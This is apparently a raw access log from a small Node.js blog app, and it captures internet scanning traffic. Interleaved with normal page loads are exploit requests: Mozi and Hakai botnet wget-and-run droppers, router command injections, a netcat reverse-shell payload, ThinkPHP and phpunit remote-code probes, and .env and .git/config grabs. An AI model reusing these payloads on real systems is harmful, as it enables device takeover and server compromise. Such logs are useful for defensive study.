GET / 304 - - 10.466 ms
GET /stylesheets/style.css 304 - - 1.310 ms
GET /css/bootstrap.min.css 304 - - 0.588 ms
GET /js/jquery.min.js 304 - - 0.614 ms
GET /js/bootstrap.min.js 304 - - 0.501 ms
GET /bloglist 304 - - 1.527 ms
GET /stylesheets/style.css 304 - - 0.503 ms
GET /css/bootstrap.min.css 304 - - 1.606 ms
GET /js/bootstrap.min.js 304 - - 2.146 ms
GET /js/jquery.min.js 304 - - 1.224 ms
GET /blogadd 304 - - 1.437 ms
GET /stylesheets/style.css 304 - - 0.406 ms
GET /css/bootstrap.min.css 304 - - 0.965 ms
GET /js/jquery.min.js 304 - - 1.141 ms
GET /js/bootstrap.min.js 304 - - 0.495 ms
GET /bloglist 304 - - 1.182 ms
GET /stylesheets/style.css 304 - - 0.640 ms
GET /js/bootstrap.min.js 304 - - 1.920 ms
GET /css/bootstrap.min.css 304 - - 1.968 ms
GET /js/jquery.min.js 304 - - 3.114 ms
GET / 304 - - 1.402 ms
GET /stylesheets/style.css 304 - - 1.637 ms
GET /css/bootstrap.min.css 304 - - 1.947 ms
GET /js/bootstrap.min.js 304 - - 1.645 ms
GET /js/jquery.min.js 304 - - 2.423 ms
GET / 200 826 - 2.151 ms
GET / 200 826 - 1.029 ms
GET / 200 826 - 1.163 ms
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://112.84.75.15:48730/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 404 847 - 1.537 ms
POST /GponForm/diag_Form?images/ 404 904 - 1.031 ms
GET / 304 - - 1.050 ms
GET /stylesheets/style.css 304 - - 0.374 ms
GET /css/bootstrap.min.css 304 - - 0.475 ms
GET /js/bootstrap.min.js 304 - - 0.617 ms
GET /js/jquery.min.js 304 - - 1.370 ms
POST /boaform/admin/formLogin 404 904 - 10.878 ms
GET / 200 826 - 1.163 ms
GET / 200 826 - 1.095 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.962 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 1.023 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 1.034 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.953 ms
GET /hudson 404 847 - 0.942 ms
GET / 200 826 - 0.942 ms
GET /stylesheets/style.css 200 89 - 2.137 ms
GET /js/bootstrap.min.js 200 60044 - 1.201 ms
GET /js/jquery.min.js 200 89476 - 2.853 ms
GET /css/bootstrap.min.css 200 160302 - 0.671 ms
GET / 200 826 - 0.962 ms
GET /blogadd 200 815 - 1.040 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.518 ms
GET /css/bootstrap.min.css 304 - - 1.423 ms
GET /js/jquery.min.js 304 - - 0.583 ms
GET /js/bootstrap.min.js 304 - - 0.441 ms
GET /bloglist 200 817 - 1.004 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.425 ms
GET /css/bootstrap.min.css 304 - - 0.701 ms
GET /js/jquery.min.js 304 - - 1.540 ms
GET /js/bootstrap.min.js 304 - - 0.508 ms
GET /js/jquery.min.js 200 89476 - 1.691 ms
GET /blogadd 304 - - 1.064 ms
GET /favicon.ico - - - - ms
GET /css/bootstrap.min.css 304 - - 0.552 ms
GET /js/jquery.min.js 304 - - 0.544 ms
GET /stylesheets/style.css 304 - - 0.322 ms
GET /js/bootstrap.min.js 304 - - 0.532 ms
GET / 304 - - 0.998 ms
GET /stylesheets/style.css 304 - - 0.935 ms
GET /css/bootstrap.min.css 304 - - 2.046 ms
GET /favicon.ico - - - - ms
GET /js/jquery.min.js 304 - - 1.770 ms
GET /js/bootstrap.min.js 304 - - 0.471 ms
GET /favicon.ico - - - - ms
GET / 200 826 - 1.006 ms
POST /api/jsonws/invoke 404 904 - 1.129 ms
GET / 200 826 - 0.938 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 847 - 1.019 ms
GET / 200 826 - 0.981 ms
GET / 200 826 - 0.946 ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 904 - 1.120 ms
GET / 200 826 - 0.980 ms
GET / 200 826 - 0.993 ms
GET / 200 826 - 0.953 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+185.132.53.147/hakaibin/h4k4i.arm7;chmod+777+/tmp/h4k4i.arm7;sh+/tmp/h4k4i.arm7+hakai.Rep.Jaws 404 847 - 1.001 ms
GET / 200 826 - 0.961 ms
GET / 200 826 - 0.987 ms
GET / 200 826 - 0.943 ms
POST /GponForm/diag_Form?images/ 404 904 - 0.746 ms
GET / 200 826 - 6.086 ms
GET / 200 826 - 1.842 ms
GET / 200 826 - 0.961 ms
GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+89.248.166.183+1245+-e+%2Fbin%2Fsh%29 404 847 - 6.774 ms
GET /ftptest.cgi?loginuse=&loginpas= 404 847 - 0.878 ms
GET / 200 826 - 1.026 ms
GET / 200 826 - 0.946 ms
GET / 200 826 - 0.944 ms
GET /dnscfg.cgi?dnsPrimary=149.56.152.185&dnsSecondary8.8.4.4&dnsDynamic=0&dnsRefresh=1 404 847 - 1.012 ms
GET / 200 826 - 0.760 ms
GET / 200 826 - 0.973 ms
GET / 200 826 - 0.940 ms
GET /portal/redlion 404 847 - 1.031 ms
GET / 200 826 - 1.014 ms
GET / 200 826 - 1.165 ms
GET / 200 826 - 1.019 ms
GET / 200 826 - 0.741 ms
GET /c/ 404 847 - 0.904 ms
GET / 200 826 - 1.024 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+185.172.111.210/beastmode/b3astmode.arm7;chmod+777+/tmp/b3astmode.arm7;sh+/tmp/b3astmode.arm7+BeastMode.Rep.Jaws - - - - ms
GET / 200 826 - 0.930 ms
GET / 200 826 - 0.941 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.982 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.984 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.950 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.965 ms
GET /.env 404 840 - 0.792 ms
POST / 404 904 - 6.452 ms
GET / 200 826 - 1.040 ms
GET / 200 826 - 1.017 ms
GET / 200 826 - 0.782 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+http://115.98.53.70:40970/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 404 847 - 0.939 ms
POST /api/jsonws/invoke 404 904 - 1.024 ms
GET / 200 826 - 1.045 ms
HEAD /robots.txt 404 847 - 0.995 ms
GET /hudson 404 847 - 2.299 ms
GET / 200 826 - 1.797 ms
GET / 200 826 - 0.941 ms
GET / 200 826 - 1.068 ms
GET / 200 826 - 0.793 ms
GET / 200 826 - 0.954 ms
GET / 200 826 - 0.960 ms
GET /muieblackcat 404 847 - 0.964 ms
GET //phpMyAdmin/scripts/setup.php 404 847 - 0.900 ms
GET //phpmyadmin/scripts/setup.php 404 847 - 0.931 ms
GET //pma/scripts/setup.php 404 847 - 1.019 ms
GET //myadmin/scripts/setup.php 404 847 - 0.898 ms
GET //MyAdmin/scripts/setup.php 404 847 - 0.885 ms
GET //Admin/scripts/setup.php 404 847 - 0.934 ms
GET //mysql/scripts/setup.php/db/scripts/setup.php/typo3/phpmyadmin/scripts/setup.php/web/phpMyAdmin/scripts/setup.php/web/scripts/setup.php/phpmyadmin2/scripts/setup.php/admin/scripts/setup.php/admin/phpmyadmin/scripts/setup.php/phpmyadmin1/scripts/setup.php/xampp/phpmyadmin/scripts/setup.php/php-my-admin/scripts/setup.php 404 847 - 0.991 ms
GET / 200 826 - 0.963 ms
GET / 200 826 - 0.947 ms
GET / 200 826 - 0.938 ms
GET / 200 826 - 0.913 ms
GET / 200 826 - 0.969 ms
GET / 200 826 - 1.013 ms
GET / 200 826 - 0.949 ms
GET /TP/public/index.php 404 847 - 0.947 ms
GET /TP/index.php 404 847 - 0.685 ms
GET /thinkphp/html/public/index.php 404 847 - 0.761 ms
GET /html/public/index.php 404 847 - 0.722 ms
GET /public/index.php 404 847 - 0.706 ms
GET /TP/html/public/index.php 404 847 - 0.738 ms
GET /elrekt.php 404 847 - 0.689 ms
GET /index.php 404 847 - 0.770 ms
GET / 200 826 - 0.791 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.887 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.889 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.962 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.880 ms
GET / 200 826 - 0.923 ms
GET / 200 826 - 0.916 ms
GET / 200 826 - 0.982 ms
GET /.env 404 840 - 0.901 ms
POST / 404 904 - 0.965 ms
POST /api/jsonws/invoke 404 904 - 0.952 ms
GET / 200 826 - 0.987 ms
GET / 200 826 - 2.342 ms
GET / 200 826 - 0.958 ms
GET / 200 826 - 0.956 ms
GET /portal/redlion 404 847 - 0.898 ms
GET / 200 826 - 0.885 ms
GET http://example.com/ 200 826 - 0.914 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 847 - 0.919 ms
GET / 200 826 - 1.031 ms
GET / 200 826 - 0.764 ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 904 - 1.039 ms
GET / 200 826 - 0.950 ms
GET / 200 826 - 0.890 ms
GET / 200 826 - 0.954 ms
GET / 200 826 - 0.921 ms
GET / 200 826 - 0.941 ms
GET / 200 826 - 1.771 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.897 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.980 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.969 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.977 ms
GET / 200 826 - 0.829 ms
POST /api/jsonws/invoke 404 904 - 0.905 ms
POST /boaform/admin/formLogin 404 904 - 0.977 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 847 - 0.973 ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 904 - 1.828 ms
GET / 200 826 - 1.001 ms
GET / 200 826 - 0.946 ms
POST /boaform/admin/formLogin 404 904 - 5.181 ms
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 404 847 - 1.077 ms
GET / 200 826 - 1.073 ms
GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2083.97.20.130%2029312%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e 404 847 - 0.933 ms
GET /config/getuser?index=0 404 847 - 0.931 ms
GET / 200 826 - 1.002 ms
GET / 200 826 - 0.913 ms
GET /hudson 404 847 - 0.870 ms
GET / 200 826 - 0.966 ms
POST /boaform/admin/formLogin 404 904 - 0.935 ms
GET / 200 826 - 0.921 ms
GET /phpmyadmin/ 404 847 - 2.323 ms
GET / 200 826 - 5.423 ms
GET / 200 826 - 0.944 ms
GET / 200 826 - 0.872 ms
POST /boaform/admin/formLogin 404 904 - 1.021 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+http://27.5.22.125:44639/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 404 847 - 1.771 ms
GET / 200 826 - 0.898 ms
POST /HNAP1/ 404 904 - 0.911 ms
GET /manager/text/list 404 847 - 0.997 ms
GET /config/getuser?index=0 404 847 - 0.963 ms
GET / 200 826 - 0.931 ms
GET / 200 826 - 0.855 ms
GET / 200 826 - 1.010 ms
GET / 200 826 - 0.700 ms
POST /GponForm/diag_Form?images/ 404 904 - 0.703 ms
GET / 200 826 - 1.840 ms
GET / 200 826 - 0.897 ms
GET /phpmyadmin/ 404 847 - 1.010 ms
POST /cgi-bin/mainfunction.cgi 404 904 - 0.799 ms
GET / 200 826 - 0.978 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.881 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.908 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.927 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.931 ms
GET /config/getuser?index=0 404 847 - 0.832 ms
HEAD /robots.txt 404 847 - 1.694 ms
GET / 200 826 - 0.903 ms
POST /GponForm/diag_Form?images/ 404 904 - 0.729 ms
GET / 200 826 - 0.919 ms
GET / 200 826 - 0.927 ms
GET / 200 826 - 0.977 ms
GET / 200 826 - 0.855 ms
POST /api/jsonws/invoke 404 904 - 0.907 ms
GET /portal/redlion 404 847 - 0.896 ms
HEAD /robots.txt 404 847 - 0.902 ms
GET / 200 826 - 1.722 ms
GET / 200 826 - 0.901 ms
GET /w00tw00t.at.blackhats.romanian.anti-sec:) 404 847 - 1.044 ms
GET /phpMyAdmin-2/scripts/setup.php 404 847 - 0.903 ms
GET /my/scripts/setup.php 404 847 - 0.884 ms
GET /MyAdmin/scripts/setup.php 404 847 - 0.860 ms
GET /PHPMYADMIN/scripts/setup.php 404 847 - 0.914 ms
GET /db/scripts/setup.php 404 847 - 0.847 ms
GET /dbadmin/scripts/setup.php 404 847 - 0.895 ms
GET /myadmin/scripts/setup.php 404 847 - 0.898 ms
GET /mysql/scripts/setup.php 404 847 - 0.855 ms
GET /mysqladmin/scripts/setup.php 404 847 - 1.638 ms
GET /pHpMyAdMiN/scripts/setup.php 404 847 - 0.866 ms
GET /phpMyAdmin/scripts/setup.php 404 847 - 0.857 ms
GET /phpadmin/scripts/setup.php 404 847 - 0.870 ms
GET /phpmyadmin/scripts/setup.php 404 847 - 0.886 ms
GET /sqladm/scripts/setup.php 404 847 - 0.900 ms
GET /sqladmin/scripts/setup.php 404 847 - 0.874 ms
GET /phpmyadmin/scripts/db.init.php 404 847 - 0.830 ms
GET /phpMyAdmin/scripts/db.init.php 404 847 - 0.858 ms
GET /MyAdmin/scripts/setup.php 404 847 - 0.890 ms
GET /database/scripts/setup.php 404 847 - 0.954 ms
GET /phpAdmin/scripts/setup.php 404 847 - 1.762 ms
GET /phpmyadmin1/scripts/setup.php 404 847 - 0.901 ms
GET /phpmyadmin2/scripts/setup.php 404 847 - 0.857 ms
GET /pma/scripts/setup.php 404 847 - 0.881 ms
GET /scripts/setup.php 404 847 - 0.867 ms
GET /setup.php 404 847 - 0.881 ms
GET / 200 826 - 0.966 ms
GET / 200 826 - 0.958 ms
POST /boaform/admin/formLogin 404 904 - 0.957 ms
GET / 200 826 - 0.971 ms
GET / 200 826 - 1.764 ms
GET / 200 826 - 0.882 ms
GET http://5.188.210.227/echo.php 404 847 - 1.010 ms
GET / 200 826 - 0.890 ms
GET / 200 826 - 0.907 ms
GET / 200 826 - 0.718 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.924 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.946 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.878 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.856 ms
HEAD /robots.txt 404 847 - 0.910 ms
GET / 200 826 - 0.919 ms
GET / 200 826 - 5.548 ms
HEAD / 200 826 - 0.910 ms
GET /.env 404 840 - 0.811 ms
POST / 404 904 - 1.023 ms
GET / 200 826 - 0.915 ms
HEAD / 200 826 - 0.939 ms
GET / 200 826 - 0.904 ms
GET /hudson 404 847 - 1.788 ms
POST /api/jsonws/invoke 404 904 - 0.862 ms
GET / 200 826 - 0.969 ms
GET / 200 826 - 0.873 ms
GET / 200 826 - 0.892 ms
GET /config/getuser?index=0 404 847 - 0.914 ms
GET / 200 826 - 0.975 ms
GET / 200 826 - 0.908 ms
GET /.env 404 840 - 0.810 ms
POST / 404 904 - 0.967 ms
GET / 200 826 - 1.724 ms
GET / 200 826 - 0.725 ms
POST /cgi-bin/mainfunction.cgi 404 904 - 0.697 ms
GET /.env 404 840 - 0.867 ms
POST / 404 904 - 0.902 ms
GET / 200 826 - 0.869 ms
GET / 200 826 - 0.954 ms
GET / 200 826 - 0.884 ms
GET / 200 826 - 2.721 ms
GET /portal/redlion 404 847 - 0.946 ms
GET / 200 826 - 1.738 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.854 ms
GET / 200 826 - 0.842 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.931 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.912 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.856 ms
GET /.env 404 840 - 0.833 ms
POST / 404 904 - 0.968 ms
GET / 200 826 - 0.894 ms
GET / 200 826 - 0.906 ms
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.6.15.166:49727/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 404 847 - 1.694 ms
POST /HNAP1/ 404 904 - 0.764 ms
POST /GponForm/diag_Form?images/ 404 904 - 0.726 ms
POST /api/jsonws/invoke 404 904 - 0.836 ms
GET / 200 826 - 0.974 ms
GET / 200 826 - 0.915 ms
GET /config/getuser?index=0 404 847 - 0.899 ms
POST /GponForm/diag_Form?images/ 404 904 - 0.721 ms
POST /GponForm/diag_Form?images/ 404 904 - 0.716 ms
GET / 200 826 - 0.919 ms
GET / 200 826 - 0.924 ms
HEAD / 200 826 - 0.963 ms
GET / 200 826 - 0.950 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.869 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.936 ms
GET /config/getuser?index=0 404 847 - 0.850 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.935 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.880 ms
GET /.env 404 840 - 0.782 ms
POST / 404 904 - 0.963 ms
GET / 200 826 - 0.910 ms
GET / 200 826 - 0.893 ms
GET / 200 826 - 0.941 ms
GET / 200 826 - 0.886 ms
GET / 200 826 - 0.864 ms
GET / 200 826 - 0.894 ms
GET / 200 826 - 0.903 ms
GET / 200 826 - 0.665 ms
GET /hudson 404 847 - 0.830 ms
POST /api/jsonws/invoke 404 904 - 0.846 ms
POST /GponForm/diag_Form?images/ 404 904 - 0.704 ms
GET / 200 826 - 1.050 ms
GET / 200 826 - 0.690 ms
GET / 200 826 - 0.984 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+37.49.226.35/jaws;chmod+777+/tmp/jaws;sh+/tmp/jaws - - - - ms
GET /TP/public/index.php 404 847 - 0.907 ms
GET /TP/index.php 404 847 - 0.914 ms
GET /thinkphp/html/public/index.php 404 847 - 1.068 ms
GET /html/public/index.php 404 847 - 0.931 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+http://111.92.52.209:46578/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 404 847 - 0.897 ms
GET /public/index.php 404 847 - 0.664 ms
GET /TP/html/public/index.php 404 847 - 1.666 ms
GET /elrekt.php 404 847 - 0.920 ms
GET /index.php 404 847 - 0.915 ms
GET / 200 826 - 0.931 ms
GET /.env 404 840 - 0.857 ms
POST / 404 904 - 0.939 ms
GET / 200 826 - 1.045 ms
GET / 200 826 - 0.969 ms
GET / 200 826 - 0.633 ms
GET / 200 826 - 0.843 ms
GET /.env 404 840 - 1.837 ms
POST / 404 904 - 0.799 ms
GET / 200 826 - 0.896 ms
HEAD / 200 826 - 0.865 ms
GET /config/getuser?index=0 404 847 - 0.852 ms
GET / 200 826 - 0.916 ms
GET / 200 826 - 0.720 ms
POST /boaform/admin/formLogin 404 904 - 0.961 ms
GET / 200 826 - 0.907 ms
GET / 200 826 - 0.884 ms
GET /v2/_catalog 404 847 - 0.900 ms
GET /.git/config 404 847 - 1.457 ms
GET /.env 404 840 - 0.570 ms
GET / 200 826 - 1.062 ms
POST /GponForm/diag_Form?images/ 404 904 - 0.687 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+http://182.112.28.31:41022/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 404 847 - 6.611 ms
GET / 200 826 - 0.896 ms
GET / 200 826 - 0.877 ms
POST /boaform/admin/formLogin 404 904 - 0.971 ms
GET / 200 826 - 0.910 ms
GET / 200 826 - 0.928 ms
GET / 200 826 - 1.804 ms
GET / 200 826 - 0.883 ms
GET / 200 826 - 0.875 ms
GET / 200 826 - 0.875 ms
GET / 200 826 - 0.904 ms
GET / 200 826 - 0.981 ms
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.116.117.87:57637/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 404 847 - 0.967 ms
GET / 200 826 - 0.936 ms
GET / 200 826 - 0.702 ms
GET / 200 826 - 0.894 ms
GET / 200 826 - 2.368 ms
GET / 200 826 - 0.936 ms
GET /TP/public/index.php 404 847 - 0.930 ms
GET /TP/index.php 404 847 - 1.014 ms
GET /thinkphp/html/public/index.php 404 847 - 0.973 ms
GET /html/public/index.php 404 847 - 0.979 ms
GET /public/index.php 404 847 - 0.944 ms
GET /TP/html/public/index.php 404 847 - 0.881 ms
GET /elrekt.php 404 847 - 0.904 ms
GET / 200 826 - 0.868 ms
GET / 200 826 - 0.882 ms
GET / 200 826 - 1.700 ms
POST /goform/webLogin 404 904 - 0.931 ms
GET / 200 826 - 0.937 ms
POST /boaform/admin/formLogin 404 904 - 0.913 ms
GET /config/getuser?index=0 404 847 - 0.923 ms
GET / 200 826 - 0.978 ms
GET / 200 826 - 0.855 ms
HEAD /MjZL 404 847 - 0.933 ms
GET / 200 826 - 1.273 ms
POST /boaform/admin/formLogin 404 904 - 0.917 ms
GET / 200 826 - 0.856 ms
GET /hudson 404 847 - 0.960 ms
GET / 200 826 - 0.837 ms
GET / 200 826 - 0.889 ms
GET /phpmyadmin/ 404 847 - 0.956 ms
GET /w00tw00t.at.blackhats.romanian.anti-sec:) 404 847 - 0.938 ms
GET /phpMyAdmin/scripts/setup.php 404 847 - 0.924 ms
GET /phpmyadmin/scripts/setup.php 404 847 - 0.724 ms
GET /pma/scripts/setup.php 404 847 - 0.777 ms
GET /myadmin/scripts/setup.php 404 847 - 0.750 ms
GET /MyAdmin/scripts/setup.php 404 847 - 0.846 ms
GET / 200 826 - 1.861 ms
GET / 200 826 - 0.860 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.889 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+http://115.96.139.142:45683/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 404 847 - 0.893 ms
GET / 200 826 - 0.860 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.884 ms
GET / 200 826 - 0.896 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.828 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.841 ms
GET / 200 826 - 0.965 ms
GET / 200 826 - 1.929 ms
GET / 200 826 - 0.921 ms
POST /HNAP1/ 404 904 - 0.890 ms
HEAD / 200 826 - 0.884 ms
GET / 200 826 - 0.897 ms
GET / 200 826 - 0.878 ms
GET / 200 826 - 0.879 ms
GET /TP/public/index.php 404 847 - 0.945 ms
GET /TP/index.php 404 847 - 0.920 ms
GET /thinkphp/html/public/index.php 404 847 - 0.940 ms
GET /html/public/index.php 404 847 - 0.895 ms
GET /public/index.php 404 847 - 1.610 ms
GET /TP/html/public/index.php 404 847 - 0.914 ms
GET /elrekt.php 404 847 - 0.955 ms
GET /index.php 404 847 - 0.896 ms
GET / 200 826 - 0.846 ms
GET /config/getuser?index=0 404 847 - 0.888 ms
GET / 200 826 - 0.887 ms
GET / 200 826 - 0.939 ms
GET / 200 826 - 0.716 ms
GET / 304 - - 0.916 ms
GET /stylesheets/style.css 304 - - 0.772 ms
GET /js/bootstrap.min.js 200 60044 - 1.131 ms
GET /js/jquery.min.js 200 89476 - 2.904 ms
GET /css/bootstrap.min.css 200 160302 - 5.626 ms
GET /favicon.ico - - - - ms
GET / 200 826 - 0.945 ms
POST /GponForm/diag_Form?images/ 404 904 - 0.747 ms
GET /config/getuser?index=0 404 847 - 0.892 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+http://182.56.210.46:55551/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 404 847 - 0.908 ms
GET http://example.com/ 200 826 - 0.922 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.944 ms
GET / 200 826 - 0.968 ms
POST /sdk 404 904 - 0.693 ms
GET / 200 826 - 1.060 ms
GET /nmaplowercheck1600752321 404 847 - 1.496 ms
GET / 200 826 - 0.843 ms
GET /evox/about 404 847 - 0.846 ms
GET /HNAP1 404 847 - 0.678 ms
GET / 200 826 - 0.877 ms
GET /favicon.ico - - - - ms
GET /Telerik.Web.UI.WebResource.axd?type=rau 404 847 - 0.894 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.888 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.907 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 3.544 ms
GET /portal/redlion 404 847 - 0.907 ms
GET / 200 826 - 0.902 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+http://78.189.60.76:50570/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 404 847 - 0.886 ms
GET / 200 826 - 0.920 ms
GET / 200 826 - 0.848 ms
GET /boaform/admin/formLogin?username=admin&psd=admin 404 847 - 0.900 ms
GET / 200 826 - 0.870 ms
GET / 200 826 - 0.979 ms
GET /boaform/admin/formLogin?username=adminisp&psd=adminisp 404 847 - 0.937 ms
GET / 200 826 - 0.937 ms
GET /solr/admin/info/system?wt=json 404 847 - 0.833 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.866 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.879 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 847 - 0.864 ms
GET / 200 826 - 0.956 ms
GET / 200 826 - 0.963 ms
GET /favicon.ico - - - - ms
GET /phpmyadmin/ 404 847 - 0.894 ms
GET / 200 826 - 0.932 ms
POST /api/jsonws/invoke 404 904 - 0.842 ms
GET / 200 826 - 0.890 ms
GET /hudson 404 847 - 1.690 ms
GET /phpmyadmin/ 404 847 - 0.918 ms
GET / 200 826 - 0.886 ms
GET / 200 826 - 0.869 ms
GET / 200 826 - 0.920 ms
GET / 200 826 - 0.719 ms
GET / 200 826 - 0.877 ms
GET / 200 826 - 0.953 ms
GET /stylesheets/style.css 200 89 - 0.990 ms
GET /js/bootstrap.min.js 200 60044 - 1.600 ms
GET /js/jquery.min.js 200 89476 - 1.738 ms
GET /css/bootstrap.min.css 200 160302 - 1.557 ms
GET /favicon.ico - - - - ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 847 - 0.903 ms
(node:26356) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
(node:26356) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose connected to mongodb://localhost/blogger
GET /blogadd 304 - - 12.605 ms
GET /stylesheets/style.css 200 89 - 3.188 ms
GET /js/bootstrap.min.js 200 60044 - 3.980 ms
GET /css/bootstrap.min.css 200 160302 - 4.196 ms
GET /js/jquery.min.js 200 89476 - 3.093 ms
GET / 304 - - 1.968 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.954 ms
GET /css/bootstrap.min.css 304 - - 1.170 ms
GET /js/jquery.min.js 304 - - 0.590 ms
GET /js/bootstrap.min.js 304 - - 0.462 ms
GET /bloglist 200 2900 - 4.912 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.742 ms
GET /css/bootstrap.min.css 304 - - 0.945 ms
GET /css/fontawesome-all.css 200 51609 - 1.528 ms
GET /js/bootstrap.min.js 304 - - 0.608 ms
GET /js/jquery.min.js 304 - - 1.405 ms
GET /webfonts/fa-solid-900.woff2 200 50372 - 1.606 ms
GET /blogedit/ 200 829 - 2.614 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 1.319 ms
GET /css/bootstrap.min.css 304 - - 1.592 ms
GET /js/jquery.min.js 304 - - 1.684 ms
